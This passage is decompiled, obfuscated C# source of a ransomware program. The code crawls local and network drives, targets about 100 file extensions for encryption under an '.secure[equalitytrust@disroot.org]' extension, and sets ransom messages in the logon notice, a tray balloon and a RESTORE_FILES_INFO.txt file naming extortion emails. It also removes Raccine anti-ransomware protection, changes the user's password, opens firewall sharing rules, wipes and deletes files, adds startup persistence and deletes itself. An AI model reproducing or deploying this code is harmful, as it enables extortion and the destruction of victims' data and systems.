		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(cxmPfnQSqmYK);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(CZuAqRlrrEeJTK("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".secure[equalitytrust@disroot.org]") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(ySfDrgDsIwD) && !fileInfo.FullName.Contains(kOKakAljNFiEE) && !fileInfo.FullName.Contains(XyiDrGGMhsB))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(hmKFRHKVooxEuV) * 1024.0 * 1024.0 && wRSpBcdZogMO == "YES")
						{
							list.Add(fileInfo.FullName);
							IWNdcDVfxJOhu(list, kegwvYmgxlGUAV, sogJRrLbEgSgQei, qwmferYisHiHM, GymlvZOhDcaID);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && wRSpBcdZogMO == "NO")
						{
							list.Add(fileInfo.FullName);
							IWNdcDVfxJOhu(list, kegwvYmgxlGUAV, sogJRrLbEgSgQei, qwmferYisHiHM, GymlvZOhDcaID);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> maaGQEQsusLv(string TnrpaADDJgrvPmp)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(TnrpaADDJgrvPmp);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.Contains("C:\\Program Files\\") && !item.FullName.Contains("C:\\Program Files (x86)\\") && !item.FullName.Contains(":\\Windows\\") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.Contains(":\\ProgramData\\") && !item.FullName.Contains("\\AppData\\") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(CZuAqRlrrEeJTK("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RESTORE_FILES_INFO") && !item.FullName.EndsWith(".secure[equalitytrust@disroot.org]") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(hmKFRHKVooxEuV) * 1024.0 * 1024.0 && wRSpBcdZogMO == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && wRSpBcdZogMO == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains(":\\windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(CZuAqRlrrEeJTK("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RESTORE_FILES_INFO") && !item3.FullName.EndsWith(".secure[equalitytrust@disroot.org]") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(hmKFRHKVooxEuV) * 1024.0 * 1024.0 && wRSpBcdZogMO == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && wRSpBcdZogMO == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static void CHYtOvzmOg()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!mVucaeNrRtoSGRM.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					mVucaeNrRtoSGRM.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string oapSGNsteEjKT(string pJCTgVJCPlDnjjE = "", string yexUFwjDzSpZGapZ = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = pJCTgVJCPlDnjjE,
				Arguments = yexUFwjDzSpZGapZ,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void wgKCxETmMjZX(string DGZFRhBZtYq)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = DGZFRhBZtYq,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ApEzVvHpDX(string aevGgkpFVbIbb)
	{
		char[] array = aevGgkpFVbIbb.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string CZuAqRlrrEeJTK(string PVkhxzTEyTScbm)
	{
		byte[] bytes = Convert.FromBase64String(PVkhxzTEyTScbm);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void BkPUDDfXiPvl(string yuCzkENcDrJAD = "", string HUjZeYjCduRky = "SW5mb3JtYXRpb24uLi4=", string HYgRIBNkvEnWpiWV = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		yuCzkENcDrJAD = ApEzVvHpDX("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(yuCzkENcDrJAD), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(CZuAqRlrrEeJTK("TGVnYWxOb3RpY2VDYXB0aW9u"), CZuAqRlrrEeJTK(HUjZeYjCduRky));
				registryKey.SetValue(CZuAqRlrrEeJTK("TGVnYWxOb3RpY2VUZXh0"), CZuAqRlrrEeJTK(HYgRIBNkvEnWpiWV));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			yuCzkENcDrJAD = ApEzVvHpDX("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(yuCzkENcDrJAD), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(CZuAqRlrrEeJTK("bGVnYWxub3RpY2VjYXB0aW9u"), CZuAqRlrrEeJTK(HUjZeYjCduRky));
				registryKey.SetValue(CZuAqRlrrEeJTK("bGVnYWxub3RpY2V0ZXh0"), CZuAqRlrrEeJTK(HYgRIBNkvEnWpiWV));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ICCsHsurCTEX()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (cgvIOHAaAfLmPm == "YES" && !string.IsNullOrEmpty(HvFMscdSmqtPxCWLg) && !string.IsNullOrEmpty(FbpdVerjgfWXZ))
				{
					BkPUDDfXiPvl("", HvFMscdSmqtPxCWLg, FbpdVerjgfWXZ);
				}
				else
				{
					BkPUDDfXiPvl();
				}
			}
		}
		catch
		{
		}
	}

	public static void cneGpqVGMUi(string rUknagPFmDJ = "SW5mb3JtYXRpb24uLi4=", string MHEfqpILSUYw = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(CZuAqRlrrEeJTK(rUknagPFmDJ));
		val.set_BalloonTipText(CZuAqRlrrEeJTK(MHEfqpILSUYw));
		val.ShowBalloonTip(30000);
	}

	public static void dicOWWYcqyk(string UqaazIzBfcHX)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		oapSGNsteEjKT(CZuAqRlrrEeJTK("bmV0LmV4ZQ=="), "user " + text + " " + UqaazIzBfcHX);
	}

	public static bool aYVdRJXDhJY()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void eKCEivlNipT(string zPmrptPTudQnF)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = CZuAqRlrrEeJTK("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + zPmrptPTudQnF;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool PvaQVsyFJwlr(string lOTwbRVIUtM, string FISlQbbWBLP)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(lOTwbRVIUtM, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(FISlQbbWBLP);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(lOTwbRVIUtM, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string ZxDNHKSpof(SecureString mptuuVAAZadIVxCR)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(mptuuVAAZadIVxCR);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void ixHYbSkpBn()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string pVkhxzTEyTScbm = ApEzVvHpDX("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(pVkhxzTEyTScbm), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("d21pYy5leGU="));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				pVkhxzTEyTScbm = ApEzVvHpDX("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(pVkhxzTEyTScbm), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("UmFjY2luZQ=="));
					registryKey.Close();
				}
				pVkhxzTEyTScbm = ApEzVvHpDX("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(pVkhxzTEyTScbm), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("UmFjY2luZQ=="));
					registryKey.Close();
				}
				pVkhxzTEyTScbm = ApEzVvHpDX("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(CZuAqRlrrEeJTK(pVkhxzTEyTScbm), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(CZuAqRlrrEeJTK("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			oapSGNsteEjKT(CZuAqRlrrEeJTK("dGFza2tpbGw="), CZuAqRlrrEeJTK("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			oapSGNsteEjKT(CZuAqRlrrEeJTK("cmVn"), CZuAqRlrrEeJTK("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			oapSGNsteEjKT(CZuAqRlrrEeJTK("cmVn"), CZuAqRlrrEeJTK("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			oapSGNsteEjKT(CZuAqRlrrEeJTK("c2NodGFza3M="), CZuAqRlrrEeJTK("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void ulcCGCvziBPMSJ(string BtIRUxmdzvoanjvJ, byte[] rwoEhSXiuPc)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(CZuAqRlrrEeJTK("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(BtIRUxmdzvoanjvJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(rwoEhSXiuPc, 0, rwoEhSXiuPc.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void aXATEwJNuqjNU()
	{
		string pVkhxzTEyTScbm = ApEzVvHpDX("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(CZuAqRlrrEeJTK(pVkhxzTEyTScbm), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(CZuAqRlrrEeJTK("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void jifSfBeSYFE()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			oapSGNsteEjKT(CZuAqRlrrEeJTK("bmV0c2g="), CZuAqRlrrEeJTK("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			oapSGNsteEjKT(CZuAqRlrrEeJTK("bmV0c2g="), CZuAqRlrrEeJTK("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void ExJYaOgZmzV(string NYlLWzRPuBkcDu)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				HbVPzLeHIOQ(NYlLWzRPuBkcDu, new string[100]
				{
					"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
					"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
					"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
					"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
					"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
					"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
					"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
					"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
					"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
					"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
				}, ".secure[equalitytrust@disroot.org]", new string[0], SCfJDJJeFRzoLD);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	public static void ppntzUOyKXarvRo()
	{
		oapSGNsteEjKT("cmd.exe", CZuAqRlrrEeJTK("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = CZuAqRlrrEeJTK("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void TIDacAxcfWvb(string zBZeUFGAssQI)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(zBZeUFGAssQI);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(zBZeUFGAssQI, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(zBZeUFGAssQI);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(zBZeUFGAssQI, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(kOKakAljNFiEE, "File: " + zBZeUFGAssQI + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string jIauvqjdBhUVg()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string scEDXtPxqzCLC(string cQvTuOjMfkeuuhdLa)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(CZuAqRlrrEeJTK("V3JpdGUgeW91ciAiS2V5IElkZW50aWZpZXIiIGZyb20gUkVTVE9SRV9GSUxFU19JTkZPLnR4dCB0byB0aGlzIGVtYWlsOiANCmVxdWFsaXR5dHJ1c3RAZGlzcm9vdC5vcmcNCm9yDQp3aWxsZXR0YW1vZmZhdEB5YWhvby5jb20="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(CZuAqRlrrEeJTK("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(cQvTuOjMfkeuuhdLa);
				if (tQdFbIlBsTQIR)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(CZuAqRlrrEeJTK("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(HEBapABdzYbQ.YXfnaAHlzuBRj());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(cQvTuOjMfkeuuhdLa) && !sTRoWRHIVycKW)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + cQvTuOjMfkeuuhdLa);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(kOKakAljNFiEE, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void DYvSkdkUPSpTWFn(string fdNaWBTLCrsh, string HukHnkOVPNC)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + fdNaWBTLCrsh + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + HukHnkOVPNC);
		streamWriter.WriteLine("IconIndex=0");
		string text = HukHnkOVPNC.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void PKcOvsDifYXZ(string[] iWjyiwwpsMm, string[] ESjZKtjnazU, string[] dcPXbfjKXhXyOGk, string GghTEHkoQkjChEVy, string kQuZrsjJTc)
	{
		IyxuTzyTKqYlHzna = Encoding.ASCII.GetBytes(GghTEHkoQkjChEVy);
		DriveInfo[] array = null;
		if (iWjyiwwpsMm[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !mVucaeNrRtoSGRM.Contains(array[i].Name))
					{
						mVucaeNrRtoSGRM.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < iWjyiwwpsMm.Length; j++)
			{
				if (!mVucaeNrRtoSGRM.Contains(iWjyiwwpsMm[j]))
				{
					mVucaeNrRtoSGRM.Add(iWjyiwwpsMm[j]);
				}
			}
		}
		if (mVucaeNrRtoSGRM.Contains(CZuAqRlrrEeJTK("Qzpc")) && ZUSwvvHcbYm == "YES")
		{
			mVucaeNrRtoSGRM.Remove(CZuAqRlrrEeJTK("Qzpc"));
		}
		Parallel.ForEach(mVucaeNrRtoSGRM, delegate(string t)
		{
			if (eEVwLQEuFPc && !jIauvqjdBhUVg().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						PvaQVsyFJwlr(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UhhaeZclnYxkU == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					gEpzfLgRuKpTSZi(t, ESjZKtjnazU, kQuZrsjJTc, dcPXbfjKXhXyOGk, GghTEHkoQkjChEVy);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				gEpzfLgRuKpTSZi(t, ESjZKtjnazU, kQuZrsjJTc, dcPXbfjKXhXyOGk, GghTEHkoQkjChEVy);
			}
		});
	}

	public static void gEpzfLgRuKpTSZi(string PSwRXleFGKXEeLaIV, string[] ZBPvBvjVnZug, string uDLZanSXUUkH, string[] orehlDHfYrgidjcT, string mtmCXYDmwvKxt)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (zuddOMKKNGT == "NO")
		{
